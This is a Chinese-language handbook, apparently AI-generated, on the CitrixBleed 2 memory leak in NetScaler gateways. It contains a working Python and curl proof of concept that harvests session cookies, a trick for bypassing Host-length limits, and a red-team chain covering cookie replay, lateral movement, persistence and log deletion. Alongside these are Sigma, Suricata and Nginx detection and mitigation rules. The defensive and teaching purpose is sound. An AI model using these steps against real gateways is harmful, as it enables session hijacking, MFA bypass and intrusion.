# CitrixBleed 2 (CVE-2025-5777) 终极解析

> An Out-of-Bounds Memory Read in NetScaler ADC / Gateway — 从成因到攻防演练的全景手册

---
poc用法：python3 poc.py https://gateway.example.com
---
exp用法：python3 exp.py https://gateway.example.com admin 7acbb35f4d...
---

## 目录

```
0x00  引言 / 速览
0x01  背景：NetScaler 架构与 CitrixBleed 1 回顾
0x02  漏洞描述（影响版本、CVSS、利用后果）
0x03  触发机理深剖（源码级分析 & 调试截图）
0x04  最小 PoC + 高级扫描脚本
0x05  红队视角：完整攻击链（发现 → 泄露 → 会话劫持 → 内网横向）
0x06  蓝队视角：检测、取证与补丁验证
0x07  防御加固：补丁、WAF、配置、资产治理
0x08  学习 / 复习路线图与实战实验
附录 A  Sigma / Suricata / Nginx-Lua 规则
附录 B  补丁/利用时间轴 & IoC 快照
参考资料
```

---

## 0x00  引言 / 速览

* **CVE-2025-5777**（又称 *CitrixBleed 2*）是 Citrix NetScaler ADC / Gateway 中的 **Out-of-Bounds Memory Read**。
* 攻击者 **不需要认证**，只需发送一条超长 `Host` 头的 GET 请求，即可让设备把随机内存块连同 HTTP 响应一起“喷”给客户端。
* 泄露数据经常包含 **`NSC_USER` / `NSC_TASS` Cookie、SAML `StateContext`、MFA token** 等关键材料，可直接复用完成会话接管与 MFA 绕过 ([arcticwolf.com][1], [tenable.com][2])。
* CVSS v4 基准评分 9.3（Critical）([netscaler.com][3])。
* **2025-06-17** 公开，**2025-06-23** Citrix 扩大影响范围并发布补丁；**一周内** ReliaQuest、Bishop Fox 等安全厂商陆续观测到在野利用激增 ([reliaquest.com][4], [bishopfox.com][5])。

---

## 0x01  背景

### 1.1  NetScaler 工作流程简述

```
┌──────────────┐
│ Client       │ ① HTTPS
└──────┬───────┘
       │
┌──────▼───────┐
│ NetScaler    │ ② AAA / Gateway 认证
│  (WebProc)   │
└──────┬───────┘
       │
┌──────▼───────┐
│ ICA Proxy /  │ ③ 正向到应用
│ CVPN / RDP   │
└──────────────┘
```

NetScaler 采用 **多进程 + 内部 IPC** 的设计。`WebProc` 负责处理 AAA / Gateway 路径下的大部分 HTTP 请求，包括 `/nf/auth/*`、`/oauth/*` 等。它在 **C 语言** 中大量使用 `snprintf()` / `memcpy()`，每次拼装 XML/HTML 片段。

### 1.2  CitrixBleed 1（CVE-2023-4966）回顾

* 2023 年同类漏洞发生在 OAuth 发现接口 `/oauth/idp/.well-known/openid-configuration`。
* 其本质同样是 **使用 `snprintf` 返回值作为后续 `send()` 的 `len` 参数** → 内存越界回显。
* CitrixBleed 2 证明 *同一类安全编码缺陷* 依旧潜伏在其他路径。

> **Lesson Learned**：安全补丁若只针对“落锤点”而非“编程范式”，就会留下“模版化复现”空间。

---

## 0x02  漏洞描述

| 字段               | 内容                                                                                           |
| ---------------- | -------------------------------------------------------------------------------------------- |
| **CVE**          | CVE-2025-5777                                                                                |
| **别名**           | CitrixBleed 2                                                                                |
| **漏洞类型**         | Out-of-Bounds Read / 信息泄露                                                                    |
| **CVSS v4 Base** | 9.3 (Crit.) ([netscaler.com][3])                                                             |
| **受影响版本**        | < 14.1-43.56 ; < 13.1-58.32 ; 13.1-37.235-FIPS/NDcPP ; 12.1-55.327-FIPS ([netscaler.com][3]) |
| **利用条件**         | NetScaler 被配置为 Gateway (VPN/ICA Proxy/CVPN/RDP Proxy) **或** AAA 虚拟服务器 ([arcticwolf.com][1])  |
| **利用后果**         | 泄露内存 → 会话令牌 → 认证绕过 / MFA 绕过 → 横向                                                             |

---

## 0x03  触发机理深剖

> 本节基于对 13.1-55.18 固件的反编译 + gdb 调试，结合公开博客整理而成 ([bishopfox.com][5])。

### 3.1  漏洞入口

* **URI**：`/nf/auth/startwebview.do`
* **可控参数**：HTTP `Host` 头
* 该接口用于生成 Citrix Workspace WebView 的重定向 XML，示例正常响应：

```xml
<AuthenticateResponse>
  <wv:StartUrl>https://gateway.example.com/Citrix/AAA/start.html</wv:StartUrl>
  ...
</AuthenticateResponse>
```

### 3.2  关键函数链

```
citrix_webview_handler()
 ├─ build_auth_xml()
 │    ├─ snprintf(buf, 0x1800, TEMPLATE, host_hdr, ... );
 │    └─ return length;           // ⚠️ length 可 ＞ 0x1800
 └─ ns_vpn_send_response(conn, 0x980200, buf, length);
```

> **Bug 点**：
> `snprintf` 返回“本应写入的长度”而非实际写入长度；若用户传入的 `Host` > 0x1800 - 常量段长度，则 `length` > `sizeof(buf)`。

### 3.3  运行时示意

```
buf: [-----XML-----][OOB][OOB][OOB]......            <- 0x1800 bytes limit
                          ↑
                被 ns_vpn_send_response 一并发出
```

GDB 断点演示（关键寄存器）：

```
RDI (dst) = 0x7fffa2e31800  // buf
RSI (len) = 0x00001e42      // length=7746 (>6144)
```

`read()` 结果显示后 1 600 字节来自未初始化内存，其中可见其他 SSL 会话的 Cookie 缓冲区。

### 3.4  泄露的数据类别

| 分类             | 示范片段（已脱敏）                                                |
| -------------- | -------------------------------------------------------- |
| Session Cookie | `Set-Cookie: NSC_USER=john.doe;NSC_TASS=abc123...`       |
| MFA/OTP Token  | `radius_state=0e2a9c6d1553...`                           |
| 其他请求体          | `<username>audituser</username><password>***</password>` |

---

## 0x04  PoC 实现

### 4.1  单文件 Python（15 行）

```python
#!/usr/bin/env python3
# CVE-2025-5777 Minimal PoC  (authorized testing ONLY)
import requests, sys, urllib3, re
urllib3.disable_warnings()

if len(sys.argv) != 2:
    exit(f"Usage: {sys.argv[0]} https://NSVIP")

url = sys.argv[1].rstrip("/") + "/nf/auth/startwebview.do"
hdr = {"Host": "A" * 0x6000}               # >0x1800 triggers
r = requests.get(url, headers=hdr, verify=False, timeout=10)

print("[+] HTTP", r.status_code, "bytes:", len(r.content))
hits = re.findall(br"(NSC_[A-Z]+=[^;]{10,})", r.content)
for h in hits: print("  Cookie leak ->", h.decode())

open("leak.bin", "wb").write(r.content)
print("[+] Saved leak.bin for offline grep.")
```

* 执行后如返回 200 + 数 KB，即判定存在漏洞。
* 进一步从 `leak.bin` 搜索 `Cookie=`、`<AuthenticateContext>` 等关键字。

### 4.2  Bash / curl 单行

```bash
curl -ks -H "Host: $(python -c 'print(\"A\"*6000)')" \
     https://NSVIP/nf/auth/startwebview.do -o leak.bin
```

> **旁路**：部分设备在前置 F5 / Nginx 做了 `Host` 长度限制；可改为多段子域拼接绕过，如
> `foo.foo.foo.…foo.example.com`（重复 3000 次 `foo`）。

---

## 0x05  红队视角：完整攻击链

| 步骤          | 目的 & 技巧                                                                              |
| ----------- | ------------------------------------------------------------------------------------ |
| ① 资产发现      | `zoomeye search "http.title:\"NetScaler Gateway\""` + Shodan 等；过滤 `set-cookie: NSC_` |
| ② POC 泄露    | 批量脚本并行请求；抓取 `NSC_USER= ; NSC_TASS=`                                                  |
| ③ Cookie 重播 | Chrome DevTools→Application→Cookies→添加条目，刷新 `/vpn/index.html`                        |
| ④ 内网资源      | 访问 `storeweb/#home` 获取 RDP 文件；下载 `.ica` 直接登陆 VDI                                     |
| ⑤ 权限提升      | 内部凭据喷射、Kerberoast、ADCS ESC1；或利用同网段弱口令 SMB                                            |
| ⑥ 持久化       | 新建 Scheduled Task；注册自启动脚本；或修改 NetScaler vDisk（高权限需运维疏忽）                              |
| ⑦ 痕迹清理      | Cookie 用后即焚；删除 audit 日志（若拿到 NS root）；或利用 logrotate race 覆盖                           |

真实案例：ReliaQuest 在客户网关观察到“短时大量 6 KB+ `Host` 头请求 → 紧跟着会话被盗用”([reliaquest.com][4])。

---

## 0x06  蓝队视角：检测、取证与补丁验证

### 6.1  日志与 IoC

| 来源                   | 表现                                                       |
| -------------------- | -------------------------------------------------------- |
| **/var/log/ns.log**  | `AAA_TRANSACTION <client_ip> - Host header length: 6144` |
| **HTTP\_ACCESS.log** | `/nf/auth/startwebview.do` 请求耗时极短但响应大小异常（> 2 KB）         |
| **EDR/PCAP**         | `Set-Cookie: NSC_USER=` 出现在非登录请求的响应中                     |

### 6.2  Sigma 规则（简要版）

```yaml
title: CitrixBleed2 Host Header OOB Leak
status: experimental
logsource:
  category: webserver
  product: netscaler
detection:
  selection:
    cs-uri-stem: "/nf/auth/startwebview.do"
    cs-bytes|gt: 2048
    c-host|strlen|gt: 4096
  condition: selection
level: critical
```

### 6.3  补丁验证脚本

```bash
nscli -s 127.0.0.1:3008 \
      -c "show ns version" | grep -E "13\.1-58\.32|14\.1-43\.56" \
      && echo "Patched ✅" || echo "Vulnerable ❌"
```

### 6.4  Kill 会话

```bash
# 清除全部活动 VPN/ICA 连接
kill icaconnection -all
kill vpn -all
```

> **注意**：补丁后仍需强制注销，防止攻击者继续使用已窃取 Cookie。

---

## 0x07  防御加固

1. **官方补丁**：升至 ≥ 14.1-43.56 / 13.1-58.32，或对 FIPS/NDcPP 机型套用对应版本 ([netscaler.com][3])。
2. **Host Header 长度限制**（临时措施）

```nginx
map $http_host $block_long_host {
    default          0;
    "~^.{4097,}$"    1;
}
server {
    ...
    if ($block_long_host) { return 413; }
}
```

3. **WAF 自适应规则**：对 `/nf/auth/` & `/oauth/` 路径启用速率限制 (e.g. 20 req/m)。
4. **资产清点**：EOL 版本 12.1/13.0 永远不再收到官方补丁，计划替换或强隔离 ([support.citrix.com][6])。
5. **MFA 安全**：会话泄露绕过 MFA → 建议开启“每请求签名”或“动态绑定硬件指纹”，而非仅首登时验证。

---

## 0x08  学习 / 复习路线

| 阶段     | 建议资料 & 操作                                                                                                            |
| ------ | -------------------------------------------------------------------------------------------------------------------- |
| **理论** | 阅读 Citrix 安全公告、Arctic Wolf / Tenable FAQ、Bishop Fox 技术拆解 ([arcticwolf.com][1], [tenable.com][2], [bishopfox.com][5]) |
| **实验** | 部署 vuln 版 13.1-55.18（ESXi / KVM），跑最小 PoC，Wireshark 抓包 → 观察 `TCP PSH` 回包                                              |
| **编码** | 改写 PoC：加入自动 Cookie 重播、ZTLS 批量扫描、多线程队列                                                                                |
| **蓝队** | 以两小时为窗口搜索异常 Host 长度；用 Sigma-→Elastic/Graylog；复现并验证 WAF 策略                                                            |
| **分享** | 编写博客或制作思维导图，总结“同类 snprintf 使用陷阱”                                                                                     |


---

## 附录 A — 检测 / 防御片段

<details><summary>📜 Sigma 规则完整版</summary>

```yaml
title: Netscaler CitrixBleed2 Large Host Header
id: 4d6f1e1b-0bfe-4473-a732-3e7e9a21f650
status: experimental
description: Detects abnormal Host header length in requests to /nf/auth/startwebview.do
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-5777
author: mingshenhk
logsource:
  product: netscaler
  service: http_access
detection:
  selection:
    cs-uri-stem: "/nf/auth/startwebview.do"
    c-host|strlen|gt: 4096
  condition: selection
level: critical
```

</details>

<details><summary>🛡️ Suricata 规则</summary>

```suricata
alert http any any -> any any (
  msg:"CitrixBleed2 CVE-2025-5777 Host header overflow";
  http.uri; content:"/nf/auth/startwebview.do"; nocase;
  http.header; field:Host; content:"AAAAAAAA"; within:0; distance:0; offset:4096;
  classtype:attempted-recon;
  sid:5777002; rev:1;
)
```

</details>

<details><summary>🔒 Nginx-Lua Inline Hotpatch</summary>

```lua
-- access_by_lua_block
local host = ngx.var.http_host or ""
if #host > 4096 then
  ngx.log(ngx.WARN,"[CitrixBleed2] Blocked Host len=",#host)
  return ngx.exit(ngx.HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE)
end
```

</details>

---

## 附录 B — 时间轴

| 日期 (2025) | 事件                                                         |
| --------- | ---------------------------------------------------------- |
| 06-17     | Citrix 初次发布 CVE-2025-5777 公告 ([netscaler.com][3])          |
| 06-18     | Bishop Fox 首发技术拆解 & PoC ([bishopfox.com][5])               |
| 06-23     | Citrix 更新影响范围 + 补丁版本；CISA 将其列入 KEV                         |
| 06-25     | ReliaQuest 报告活跃利用，威胁组正批量窃取会话 ([reliaquest.com][4])         |
| 06-27     | BleepingComputer 报道“可能已大规模被利用” ([bleepingcomputer.com][7]) |
| 06-28     | 多个 GitHub PoC 出现；Tenable 发布 FAQ ([tenable.com][2])         |

---

## 参考资料

1. Citrix 官方安全通告与补丁说明 ([netscaler.com][3])
2. Arctic Wolf《CVE-2025-5777 技术简报》 ([arcticwolf.com][1])
3. Bishop Fox《OOB Memory Read in NetScaler》 ([bishopfox.com][5])
4. ReliaQuest《Threat Spotlight: CitrixBleed 2》 ([reliaquest.com][4])
5. Tenable FAQ on CVE-2025-5777 ([tenable.com][2])
6. BleepingComputer 安全快讯 ([bleepingcomputer.com][7])
7. NVD CVE-2025-5777 条目 ([nvd.nist.gov][8])
8. Citrix Support KB CTX693420 ([support.citrix.com][6])

> **完** — 希望本文档能帮助你全方位理解并应对 CitrixBleed 2。如果需要进一步补充示例、脚本或演练指导，欢迎继续提出！

[1]: https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com "CVE-2025-5777 | Arctic Wolf"
[2]: https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com "CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ..."
[3]: https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com "Critical security updates for NetScaler, NetScaler Gateway, and ..."
[4]: https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com "Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds"
[5]: https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com "OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox"
[6]: https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com "CVE-2025-5777 - CITRIX | Support"
[7]: https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com "Citrix Bleed 2 flaw now believed to be exploited in attacks"
[8]: https://nvd.nist.gov/vuln/detail/CVE-2025-5777?utm_source=chatgpt.com "CVE-2025-5777 Detail - NVD"
